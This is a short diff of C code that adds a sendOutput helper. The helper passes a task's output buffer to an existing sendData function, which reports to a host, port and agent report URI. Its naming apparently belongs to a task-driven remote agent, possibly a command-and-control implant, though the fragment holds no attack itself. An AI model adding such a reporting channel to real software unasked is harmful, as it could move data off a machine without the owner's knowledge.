@@ -57,3 +57,9 @@ void sendData(int taskId, char* typ, char* error, int size, char * buff) {
     host, port, agent.report_uri, outputMessage.buf, outputMessage.bufsize
   );
 }
+
+void sendOutput(int taskId, struct TLVBuild tlv) {
+  sendData(
+    taskId, "output", "", tlv.bufsize, tlv.buf
+  );
+}
